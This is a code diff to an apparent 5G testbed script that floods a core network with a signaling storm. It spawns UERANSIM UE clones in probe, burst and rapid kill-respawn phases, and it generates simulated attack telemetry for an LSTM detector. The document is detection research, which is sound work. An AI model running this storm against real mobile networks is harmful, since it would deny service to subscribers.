@@ -66,8 +66,28 @@ def launch_signaling_storm(
         binary = ueransim_path / "build" / "nr-ue"
         processes = []
 
-        while (time.time() - start) < burst_duration_seconds:
-            for i in range(num_clones):
+        # Phase 1: Probe
+        print("[attack] Phase 1 (Probe): Spawning 5 UEs")
+        for i in range(5):
+            try:
+                proc = subprocess.Popen(
+                    ["sudo", str(binary), "-c", str(ue_config_path)],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
+                processes.append(proc)
+                events.append({"time": time.time(), "event": "PROBE_ATTACH"})
+            except FileNotFoundError:
+                break
+            time.sleep(0.5)
+            
+        time.sleep(2.0) # wait before phase 2
+        
+        # Phase 2: Surge (burst array)
+        print("[attack] Phase 2 (Surge): Sudden massive blocks")
+        burst_groups = [10, 20, 20] # Split 50 clones 
+        for burst in burst_groups:
+            for i in range(burst):
                 try:
                     proc = subprocess.Popen(
                         ["sudo", str(binary), "-c", str(ue_config_path)],
@@ -75,29 +95,51 @@ def launch_signaling_storm(
                         stderr=subprocess.DEVNULL,
                     )
                     processes.append(proc)
-                    events.append({
-                        "time": time.time(),
-                        "event": "STORM_ATTACH",
-                        "clone_id": i,
-                    })
                 except FileNotFoundError:
                     break
-
-            time.sleep(attach_detach_interval)
-
-            # Kill all clones to force deregistration
-            for proc in processes:
-                try:
-                    proc.kill()
-                except Exception:
-                    pass
-            processes.clear()
-
-            events.append({
-                "time": time.time(),
-                "event": "STORM_DETACH_ALL",
-                "count": num_clones,
-            })
+            print(f"[attack] Slammed core with sudden {burst} UE registrations!")
+            events.append({"time": time.time(), "event": "SURGE_ATTACH", "count": burst})
+            time.sleep(0.5) # Let core absorb the sudden block before next spike
+            
+        time.sleep(2.0)
+        
+        # Phase 3: Slam (rapid kill-spawn cycle)
+        print("[attack] Phase 3 (Slam): Rapid Kill-Spawn cycles")
+        slam_duration = burst_duration_seconds - (time.time() - start)
+        if slam_duration > 0:
+            end_time = time.time() + slam_duration
+            while time.time() < end_time:
+                # kill
+                for proc in processes:
+                    try:
+                        proc.kill()
+                    except Exception:
+                        pass
+                processes.clear()
+                events.append({"time": time.time(), "event": "SLAM_DETACH_ALL"})
+                time.sleep(0.1)
+                
+                # spawn
+                for i in range(20):
+                    try:
+                        proc = subprocess.Popen(
+                            ["sudo", str(binary), "-c", str(ue_config_path)],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                        )
+                        processes.append(proc)
+                    except FileNotFoundError:
+                        break
+                events.append({"time": time.time(), "event": "SLAM_ATTACH_ALL", "count": 20})
+                time.sleep(0.1)
+                
+        # Final cleanup
+        for proc in processes:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+        processes.clear()
     else:
         # Simulation mode — just log events
         cycle = 0
@@ -148,27 +190,19 @@ def generate_attack_telemetry(
     pd.DataFrame
         Attack telemetry with spiked metrics.
     """
-    rng = np.random.default_rng(seed)
-    num_samples = int(duration_seconds / poll_interval)
-    rows = []
+    from telemetry.collector import generate_simulated_telemetry
 
-    for i in range(num_samples):
-        rows.append({
-            "timestamp": f"attack_{i}",
-            "elapsed": round(i * poll_interval, 3),
-            "app_ngap_messages_total": float(rng.poisson(150 * intensity)),
-            "app_nas_messages_total": float(rng.poisson(120 * intensity)),
-            "app_active_sessions": float(max(1, int(rng.normal(50, 15)))),
-            "app_registration_requests_total": float(rng.poisson(80 * intensity)),
-            "app_auth_failures_total": float(rng.poisson(40 * intensity)),
-            "app_request_latency_seconds": float(
-                max(0.001, rng.normal(0.25 * intensity, 0.08))
-            ),
-        })
-
-    df = pd.DataFrame(rows)
+    # Use the same parametric sine+clone model as the live collector so
+    # the LSTM sees statistically consistent attack signatures.
+    df = generate_simulated_telemetry(
+        duration_seconds=duration_seconds,
+        poll_interval=poll_interval,
+        attack_start_frac=0.0,                          # 100% attack window
+        ue_clone_count_during_attack=int(20 * intensity),  # scale by intensity
+        seed=seed,
+    )
     print(f"[attack] Generated {len(df)} attack telemetry samples "
-          f"(intensity={intensity:.1f}x)")
+          f"(intensity={intensity:.1f}x, clones={int(20*intensity)})")
     return df
 
 
@@ -177,19 +211,32 @@ def generate_attack_telemetry(
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
     import argparse
+    from telemetry.collector import cleanup_stale_ue_processes
 
     parser = argparse.ArgumentParser(description="Launch signaling storm attack")
-    parser.add_argument("--clones", type=int, default=50)
-    parser.add_argument("--duration", type=float, default=10.0)
+    parser.add_argument("--clones",    type=int,   default=50)
+    parser.add_argument("--duration",  type=float, default=10.0)
     parser.add_argument("--simulated", action="store_true")
+    parser.add_argument("--cleanup",   action="store_true",
+                        help="Kill stale nr-ue processes before launching")
     args = parser.parse_args()
+
+    if args.cleanup:
+        n = cleanup_stale_ue_processes()
+        print(f"[attack] Pre-run cleanup: killed {n} stale process(es).")
 
     if args.simulated:
         df = generate_attack_telemetry(duration_seconds=args.duration)
         print(df.head())
     else:
+        from pathlib import Path
+        project_root = Path(__file__).resolve().parents[1]
+        ueransim_path = project_root / "UERANSIM"
+        ue_config_path = project_root / "config" / "ue.yaml"
         events = launch_signaling_storm(
             num_clones=args.clones,
             burst_duration_seconds=args.duration,
+            ueransim_path=ueransim_path,
+            ue_config_path=ue_config_path,
         )
         print(f"Total events: {len(events)}")
